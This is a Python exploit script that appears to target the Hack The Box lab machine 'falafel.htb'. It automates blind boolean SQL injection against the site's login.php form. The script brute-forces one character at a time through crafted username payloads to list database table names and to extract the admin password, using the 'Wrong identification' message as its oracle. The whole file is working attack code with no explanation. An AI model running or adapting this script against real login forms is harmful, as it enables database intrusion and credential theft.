import requests
import urllib


proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
lab_url = "http://falafel.htb/login.php"


def extract_tables():
    session = requests.Session()
    stop_extract = False

    for table_num in range(0, 20):    
        table_name = ""

        for indx in range(1, 100):
            for chr_ in range(47, 123):

                sql_string = "'+OR+ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+LIMIT+{},1),{},1))={}--+-".format(table_num, indx, chr_)
                data = { 'username': sql_string, 'password':'pass'}

                req = requests.Request('POST', lab_url, data=data)
                prep = session.prepare_request(req)
                prep.body = urllib.parse.unquote(prep.body)
                prep.headers['Content-length'] = len(prep.body)

                resp = session.send(prep, 
                    #proxies=proxies
                    )
            
                if "Wrong identification" in resp.text:
                    table_name = table_name + chr(chr_)
                    break

            # End of table_name (ascii 0)
            if chr_ == 122:
                if indx == 1:
                    stop_extract = True
                    break

                print("{} table_name: {}".format(table_num, table_name))
                break

        # Stop searching tables       
        if stop_extract == True:
            break

def extract_user_passwords():
    session = requests.Session()
    stop_extract = False

    for pass_num in range(0, 20):    
        password = ""

        for indx in range(1, 100):
            for chr_ in range(47, 123):

                sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, chr_)
                data = {'username': sql_string, 'password':'pass'}

                req = requests.Request('POST', lab_url, data=data)
                prep = session.prepare_request(req)
                prep.body = urllib.parse.unquote(prep.body)
                prep.headers['Content-length'] = len(prep.body)

                resp = session.send(prep)

                if "Wrong identification" in resp.text:
                    password = password + chr(chr_)
                    break

            if chr_ == 122:
                if indx == 1:
                    stop_extract = True
                    break

                print("{} password: {}".format(pass_num, password))
                break

        # Stop searching tables       
        if stop_extract == True:
            break

def main():
    # extract_tables()
    extract_user_passwords()
    

if __name__ == "__main__":
    main()